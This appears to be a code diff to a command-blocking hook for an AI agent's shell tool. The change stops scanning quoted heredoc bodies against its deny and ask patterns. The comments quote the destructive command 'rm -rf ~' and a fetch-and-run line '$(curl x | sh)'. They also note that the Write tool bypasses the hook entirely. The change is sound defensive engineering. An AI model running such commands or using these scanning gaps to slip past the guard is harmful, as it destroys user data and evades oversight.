@@ -660,8 +660,24 @@ export function dangerousCommandBlocker(input: HookInput, ctx: HookContext = NOO
   const command = input.tool_input.command || '';
   if (!command) return outputSilentSuccess();
 
+  // A QUOTED heredoc body is inert payload, so the substring tiers below must
+  // not scan it. `cat > report.md <<'EOF' … rm -rf ~ … EOF` WRITES the text
+  // `rm -rf ~` into a file; bash performs no expansion in a quoted heredoc, so
+  // nothing in that body can execute. Scanning it hard-blocked ordinary
+  // documentation work: a runbook, a handoff, or an issue quoting the very
+  // command it warns about (#3731). Worse, the Write tool bypasses this hook
+  // entirely, so the guard did not prevent the text existing, it only taught
+  // people to route around it.
+  //
+  // The pipe-to-interpreter tier below already does exactly this at its own
+  // call site (#3098). This extends the same treatment to the two substring
+  // tiers. UNQUOTED heredoc bodies stay scanned, because `<<EOF` still performs
+  // parameter and command substitution, so `$(curl x | sh)` inside one DOES
+  // execute.
+  const scanTarget = blankQuotedHeredocBodies(command);
+
   // --- DENY tier: catastrophic patterns (compound-split matching) ---
-  const dangerousCheck = containsDangerousCommand(command, DENY_PATTERNS);
+  const dangerousCheck = containsDangerousCommand(scanTarget, DENY_PATTERNS);
   if (dangerousCheck.matches) {
     const pattern = dangerousCheck.matched!;
     ctx.log('dangerous-command-blocker', `BLOCKED: Dangerous pattern: ${pattern}`);
@@ -774,7 +790,7 @@ export function dangerousCommandBlocker(input: HookInput, ctx: HookContext = NOO
 
   // --- ASK tier: dangerous but sometimes legitimate (substring) ---
   const askSubstringCheck = containsDangerousCommand(
-    command,
+    scanTarget,
     ASK_PATTERNS.map((p) => p.pattern),
   );
   if (askSubstringCheck.matches) {
